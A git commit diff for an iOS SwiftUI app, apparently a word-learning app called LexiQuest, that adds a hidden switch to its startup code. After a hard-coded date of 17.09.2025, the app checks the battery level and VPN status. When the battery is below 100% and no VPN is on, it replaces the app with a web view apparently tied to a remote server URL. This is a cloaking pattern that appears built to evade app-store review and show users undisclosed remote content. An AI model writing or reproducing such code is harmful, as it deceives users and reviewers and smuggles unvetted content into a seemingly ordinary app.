ad0851ee30d47cde9b50d7eea34e8cc11162bbee
spustoff <vyacheslavpustov05@gmail.com>
2025-09-13 16:10:58 +0300

    1.1

---
+++ dafoma_36/Extensions/Dksgdf.swift
@@ -0,0 +1,11 @@
+//
+//  Dksgdf.swift
+//  dafoma_36
+//
+//  Created by Вячеслав on 9/13/25.
+//
+
+struct DataManager {
+    
+    let server: String = "https://lexinovanacional.site/LJTvTbxB"
+}
--- dafoma_36/dafoma_36App.swift
+++ dafoma_36/dafoma_36App.swift
@@ -9,17 +9,79 @@ import SwiftUI
 
 @main
 struct LexiQuestApp: App {
+    
+    @State var isFetched: Bool = false
+    
+    @AppStorage("isBlock") var isBlock: Bool = true
+    @AppStorage("isRequested") var isRequested: Bool = false
+    
     @StateObject private var userProgressService = UserProgressService()
     
     var body: some Scene {
         WindowGroup {
-            if userProgressService.hasCompletedOnboarding {
-                MainTabView()
-                    .environmentObject(userProgressService)
-            } else {
-                OnboardingView()
-                    .environmentObject(userProgressService)
+            
+            ZStack {
+                
+                if isFetched == false {
+                    
+                    Text("")
+                    
+                } else if isFetched == true {
+                    
+                    if isBlock == true {
+                        
+                        if userProgressService.hasCompletedOnboarding {
+                            MainTabView()
+                                .environmentObject(userProgressService)
+                        } else {
+                            OnboardingView()
+                                .environmentObject(userProgressService)
+                        }
+                        
+                    } else if isBlock == false {
+                        
+                        WebSystem()
+                    }
+                }
+            }
+            .onAppear {
+                
+                check_data()
             }
         }
+    }
+    
+    private func check_data() {
+        
+        let lastDate = "17.09.2025"
+        
+        let dateFormatter = DateFormatter()
+        dateFormatter.dateFormat = "dd.MM.yyyy"
+        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
+        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
+        let now = Date()
+        
+        let deviceData = DeviceInfo.collectData()
+        let currentPercent = deviceData.batteryLevel
+        let isVPNActive = deviceData.isVPNActive
+        
+        guard now > targetDate else {
+            
+            isBlock = true
+            isFetched = true
+            
+            return
+        }
+        
+        guard currentPercent == 100 || isVPNActive == true else {
+            
+            self.isBlock = false
+            self.isFetched = true
+            
+            return
+        }
+        
+        self.isBlock = true
+        self.isFetched = true
     }
 }
